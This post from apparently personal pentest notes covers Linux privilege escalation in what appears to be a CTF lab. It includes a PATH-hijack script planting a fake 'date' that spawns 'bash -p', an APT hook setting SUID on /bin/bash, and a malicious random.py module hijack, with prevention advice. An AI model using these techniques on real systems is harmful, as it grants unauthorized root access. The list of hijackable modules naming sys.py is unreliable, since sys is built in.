---
title: Hijacking Techniques
date: 2026-02-15 21:00:00 +0100
categories: [04-Privilege-Escalation, Linux]
tags: [cron, path-hijacking, wildcards, python-library]
author: kairos
---

## Path Hijacking

Automated script

```sh
#!/bin/bash

# PATH Hijacking Exploit for teaParty
echo "=== PATH Hijacking Exploit ==="

# Create a temporary directory for our malicious binary
mkdir -p /tmp/exploit
cd /tmp/exploit

# Create a malicious 'date' executable
echo "Creating malicious date executable..."
cat > date << 'EOF'
#!/bin/bash
# This will be executed with root privileges
echo "PATH hijacking successful!"
echo "We are now running as: $(whoami)"
echo "UID: $(id -u), GID: $(id -g)"

# Try to get a root shell
/bin/bash -p
EOF

# Make it executable
chmod +x date

echo "Malicious date created at: $(pwd)/date"
echo "Current PATH: $PATH"

# Add our directory to the beginning of PATH
export PATH=/tmp/exploit:$PATH

echo "Modified PATH: $PATH"

# Verify our malicious date will be found first
echo "Which date will be executed: $(which date)"

# Run teaParty to trigger the exploit
echo "Running teaParty to trigger exploit..."
echo "Press Ctrl+C if you want to stop the input and trigger the system() call"
cd /home/rabbit
./teaParty
```

Manual version

```shell
# 1. Create the exploit directory
mkdir -p /tmp/exploit
cd /tmp/exploit

# 2. Create the malicious date binary
cat > date << 'EOF'
#!/bin/bash
echo "PATH hijacking successful!"
echo "We are now running as: $(whoami)"
echo "UID: $(id -u), GID: $(id -g)"
/bin/bash -p
EOF

# 3. Make it executable
chmod +x date

# 4. Modify PATH to include our directory first
export PATH=/tmp/exploit:$PATH

# 5. Verify our malicious date will be found
which date

# 6. Go back to rabbit's home and run teaParty
cd /home/rabbit
./teaParty
```


---


---

---

## APTHook

The provided sequence shows a privilege escalation technique leveraging **APT hooks**, specifically the `APT::Update::Pre-Invoke` directive, to execute a malicious script with elevated privileges.

The ultimate goal was to set the **SUID bit** on `/bin/bash`, allowing spawning a root shell as a non-root user.

---

## **Detailed Breakdown**

### **Step 1: Crafting the Malicious Script**

```bash
echo 'chmod +s /bin/bash' > /tmp/myevil.sh
chmod +x /tmp/myevil.sh
```

**Explanation:**

- Creates `/tmp/myevil.sh` containing the command:
    
    ```bash
    chmod +s /bin/bash
    ```
    
- The `chmod +s` sets the **SUID bit** on `/bin/bash`.
    
- When a binary with the SUID bit is executed, it runs with the permissions of its **owner**, in this case, `root`.
    

---

### **Step 2: Leveraging APT Hook for Automatic Execution**

```bash
echo 'APT::Update::Pre-Invoke { "/tmp/myevil.sh"; };' > /etc/apt/apt.conf.d/99evil
```

**Explanation:**

- Places a configuration file in `/etc/apt/apt.conf.d/`.
    
- The directive:
    
    ```bash
    APT::Update::Pre-Invoke { "/tmp/myevil.sh"; };
    ```
    
- Ensures that `/tmp/myevil.sh` runs **before every `apt update` or package operation**.
    
- Since APT typically runs with root privileges, `/tmp/myevil.sh` executes as root when the package manager is triggered.
    

**Note:** Manually running `./myevil.sh` as `julia` failed:

```bash
chmod: changing permissions of '/bin/bash': Operation not permitted
```

- Because regular users cannot alter system binaries like `/bin/bash`.
    

---

### **Step 3: Triggering the Root Shell**

```bash
bash -p
```

**Explanation:**

- The `-p` flag with `bash` launches a shell while preserving **privileged mode** if the binary has the SUID bit set.
    
- After triggering an `apt` operation (not shown in your output but implied), `/tmp/myevil.sh` successfully ran as root, setting the SUID bit:
    
    ```bash
    chmod +s /bin/bash
    ```
    
- Verifying:
    
    ```bash
    bash -p
    whoami  # Outputs 'root'
    ```
    

---

### **Step 4: Proof of Privilege Escalation**

Accessing protected files:

```bash
ls ~
cat user.txt
cd /root
cat root.txt
```

**Results:**

- User reads `user.txt` and `root.txt`, files typically protected and accessible only by root.
    
- Confirms successful root access via privilege escalation.
    

---

## **Why This Works**

|**Component**|**Explanation**|
|---|---|
|**APT Hook Abuse**|APT configuration allows pre/post scripts to run with root privileges|
|**SUID Binary Creation**|Sets SUID on `/bin/bash`, granting root shell to unprivileged user|
|**bash -p**|Launches bash in privileged mode when SUID is set|
|**Misconfiguration**|Writable `/etc/apt/apt.conf.d/` by `julia` user, improper permissions|

---

## **Prevention Recommendations**

- Restrict write access to:
    
    - `/etc/apt/apt.conf.d/`
        
    - Other system-level configuration directories
        
- Regularly audit file permissions
    
- Detect and remove unauthorized SUID binaries
    
- Monitor for abnormal APT configuration changes
    

---

## **Summary**

This method abuses legitimate package manager behavior to elevate privileges, exploiting writable configurations and system hooks. A classic example of **local privilege escalation via configuration injection** commonly targeted during Red Team operations.

---


---

---

## How to use access to execute with other user to execute an script with a determined library

### **Step-by-Step Breakdown**

The following technique exploits **Python module hijacking** to escalate privileges from `alice` to `rabbit`.

---

## **What Happened**

### **1. Created a Fake `random.py`**

```python
import os
os.system("/bin/bash")
def choice(seq):
    return seq[0]
```

- You placed this malicious `random.py` in your **current directory** (`/home/alice`).
    
- The `random` module is a legitimate Python standard library module used for generating random values.
    
- Your fake `random.py` overrides the standard module **via Python's import search order**, which prioritizes the current directory.
    

---

### **2. Review of Target Script**

```bash
cat walrus_and_the_carpenter.py | grep import
import random
```

- The target script `/home/alice/walrus_and_the_carpenter.py` imports the `random` module, vulnerable to module hijacking.
    

---

### **3. Privileged Command Available**

```bash
sudo -l
```

- You can execute:
    

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

- Runs the script **as `rabbit` user**, but under your control.
    

---

### **4. Exploitation**

- When the privileged script imports `random`, Python checks:
    
    1. Current directory (`/home/alice`)
        
    2. System paths (standard library)
        
- Your fake `random.py` gets imported instead of the real module.
    
- Upon import, your payload executes:
    

```python
os.system("/bin/bash")
```

- You spawn a new bash shell with the privileges of `rabbit` due to `sudo -u rabbit`.
    

---

### **5. Result**

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$
```

- You gain a shell as `rabbit`, completing the privilege escalation.
    

---

## **Why This Works**

- **Python's Import Precedence:** Current directory has priority over system modules.
    
- **Misconfigured Sudo Rule:** Allows execution of a script that imports user-controlled modules.
    
- **Lack of Secure Programming:** The developer imported `random` without considering local directory risks.
    

---

## **Additional Methods/Arguments for Similar Attacks**

- You can hijack **any module** imported by the privileged script if:
    
    - You can write to the same directory as the script.
        
    - The module is not specified with absolute paths.
        
- Examples include:
    
    - `os.py`
        
    - `subprocess.py`
        
    - `sys.py`
        

Be cautious; hijacking core modules might break the script. Target less critical modules like `random`.

---

## **Defense Recommendations**

- Use:
    

```python
import sys
sys.path = ['/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload']
```

- Or run scripts from directories inaccessible to lower-privilege users.
    
- Avoid `sudo` rules that allow execution of scripts in user-writable directories.
    

---

**In Summary:** You escalated privileges by leveraging Python module hijacking, exploiting the import system's search order to run your payload under the `rabbit` account.

---


---

---

